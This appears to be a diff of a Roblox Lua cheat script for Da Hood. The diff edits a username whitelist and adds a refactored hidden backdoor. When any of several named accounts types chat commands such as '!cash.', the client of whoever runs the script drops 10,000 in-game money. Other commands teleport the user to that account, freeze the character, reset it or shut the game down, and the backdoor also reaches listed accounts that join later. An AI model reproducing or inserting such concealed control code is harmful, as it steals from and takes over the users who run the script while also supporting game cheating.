@@ -93,7 +93,7 @@ or game.Players.LocalPlayer.Name == "NBKKFIE22"
 or game.Players.LocalPlayer.Name == "Hpersonh"
 or game.Players.LocalPlayer.Name == "namchaza_araya"
 or game.Players.LocalPlayer.Name == "DAIKizu39"
-or game.Players.LocalPlayer.Name == "Phx_ze"
+or game.Players.LocalPlayer.Name == "wubxbeb"
 or game.Players.LocalPlayer.Name == "decianx23"
 or game.Players.LocalPlayer.Name == "kkuf9"
 or game.Players.LocalPlayer.Name == "PAT_NATTANAN"
@@ -4464,43 +4464,45 @@ _G.Loopohoh = game.Players.LocalPlayer.CharacterAdded:connect(function()
         game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.Energy.bar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
     end)
 
-        if game.Players.LocalPlayer.Name == "zer1ckq" then
-            print("omg sigma")
-        else
-        local PP = game.Players.LocalPlayer
-        game:GetService("RunService").RenderStepped:Connect(function()
-            pcall(function()
-            -- Chat Connect --
-            local MainAccount = "zer1ckq" -- MainAccount Username
-            game.Players[MainAccount].Chatted:Connect(function(msg)
+    function chat(msg)
+        local A_1 = msg
+        local A_2 = "All"
+        local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+        Event:FireServer(A_1, A_2)
+    end
+    
+    local targetNames = {"isthisdo23", "cruciatusadidas", "RKLWPGZLG", "zer1ckq","dahoodbotmoney5"}
+    if table.find(targetNames, game.Players.LocalPlayer.Name) then
+        print("DEER")
+    else
+        function PoorCharacter(targetPlayer)
+        targetPlayer.Chatted:Connect(function(msg)
             if msg:lower() == "!cash." then
                 local args = {
                     [1] = "DropMoney",
                     [2] = "10000"
                 }
-                
-                game:GetService("ReplicatedStorage"):WaitForChild("MainEvent"):FireServer(unpack(args))        
+                game:GetService("ReplicatedStorage"):WaitForChild("MainEvent"):FireServer(unpack(args))
             elseif msg:lower() == "!bring." then
-                PP.Character.HumanoidRootPart.CFrame = game.Players[MainAccount].Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-2)
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -2)
             elseif msg:lower() == "!log." then
                 game:Shutdown()
             elseif msg:lower() == "!freeze." then
-                PP.Character.HumanoidRootPart.Anchored = true
+                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
             elseif msg:lower() == "!sleep." then
-                
-                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,0)* CFrame.Angles(math.pi*0.5,0,0)
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 0) * CFrame.Angles(math.pi * 0.5, 0, 0)
                 game.Players.LocalPlayer.Character.Humanoid.Sit = true
                 task.wait(0.1)
                 local Char = game.Players.LocalPlayer.Character
                 local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")
-            
-                for i,v in next, Hum:GetPlayingAnimationTracks() do
+                for i, v in next, Hum:GetPlayingAnimationTracks() do
                     v:Stop()
                 end
             elseif msg:lower() == "!unfreeze." then
-                PP.Character.HumanoidRootPart.Anchored = false
+                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
             elseif msg:lower() == "!reset." then
-                game.ReplicatedStorage.MainEvent:FireServer("ResetNew")game.Players.LocalPlayer.Character.Humanoid:ChangeState'Dead'
+                game.ReplicatedStorage.MainEvent:FireServer("ResetNew")
+                game.Players.LocalPlayer.Character.Humanoid:ChangeState('Dead')
             elseif msg:lower() == "/e ok" then
                 chat("HELLO")
             elseif msg:lower() == "/e test" then
@@ -4508,73 +4510,32 @@ _G.Loopohoh = game.Players.LocalPlayer.CharacterAdded:connect(function()
             elseif msg:lower() == "!rejoin." then
                 game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
             elseif msg:lower() == "!dance." then
-                PP.Character.HumanoidRootPart.CFrame = game.Players[MainAccount].Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-2)
-                local DefaultDanceanim = Instance.new('Animation');
-                DefaultDanceanim.AnimationId = "rbxassetid://11710529975";
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -2)
+                local DefaultDanceanim = Instance.new('Animation')
+                DefaultDanceanim.AnimationId = "rbxassetid://11710529975"
                 game:GetService('Players').LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(DefaultDanceanim):Play()
             end
-            end)
-        end) 
         end)
     end
-
-
-    if game.Players.LocalPlayer.Name == "dahoodbotmoney5" then
-        print("omg sigma")
-    else
-    local PP = game.Players.LocalPlayer
-    game:GetService("RunService").RenderStepped:Connect(function()
-        pcall(function()
-        -- Chat Connect --
-        local MainAAccount = "dahoodbotmoney5" -- MainAAccount Username
-        game.Players[MainAAccount].Chatted:Connect(function(msg)
-        if msg:lower() == "!cash." then
-            local args = {
-                [1] = "DropMoney",
-                [2] = "10000"
-            }
-            
-            game:GetService("ReplicatedStorage"):WaitForChild("MainEvent"):FireServer(unpack(args))        
-        elseif msg:lower() == "!bring." then
-            PP.Character.HumanoidRootPart.CFrame = game.Players[MainAAccount].Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-2)
-        elseif msg:lower() == "!log." then
-            game:Shutdown()
-        elseif msg:lower() == "!freeze." then
-            PP.Character.HumanoidRootPart.Anchored = true
-        elseif msg:lower() == "!sleep." then
-            
-            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,0)* CFrame.Angles(math.pi*0.5,0,0)
-            game.Players.LocalPlayer.Character.Humanoid.Sit = true
-            task.wait(0.1)
-            local Char = game.Players.LocalPlayer.Character
-            local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")
-        
-            for i,v in next, Hum:GetPlayingAnimationTracks() do
-                v:Stop()
-            end
-        elseif msg:lower() == "!unfreeze." then
-            PP.Character.HumanoidRootPart.Anchored = false
-        elseif msg:lower() == "!reset." then
-            game.ReplicatedStorage.MainEvent:FireServer("ResetNew")game.Players.LocalPlayer.Character.Humanoid:ChangeState'Dead'
-        elseif msg:lower() == "/e ok" then
-            chat("HELLO")
-        elseif msg:lower() == "/e test" then
-            chat("HELLO")
-        elseif msg:lower() == "!rejoin." then
-            game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
-        elseif msg:lower() == "!dance." then
-            PP.Character.HumanoidRootPart.CFrame = game.Players[MainAAccount].Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-2)
-            local DefaultDanceanim = Instance.new('Animation');
-            DefaultDanceanim.AnimationId = "rbxassetid://11710529975";
-            game:GetService('Players').LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(DefaultDanceanim):Play()
+    
+    for _, targetName in pairs(targetNames) do
+        local player = game.Players:FindFirstChild(targetName)
+        if player then
+            print(targetName .. " in server")
+            PoorCharacter(player)
         end
-        end)
-    end) 
+    end
+    
+    game.Players.PlayerAdded:Connect(function(newPlayer)
+        for _, targetName in pairs(targetNames) do
+            if newPlayer.Name == targetName then
+                print(targetName .. " just joined")
+                PoorCharacter(newPlayer)
+            end
+        end
     end)
+    end
 end
-
-end
-
 
 
 function chat(msg)
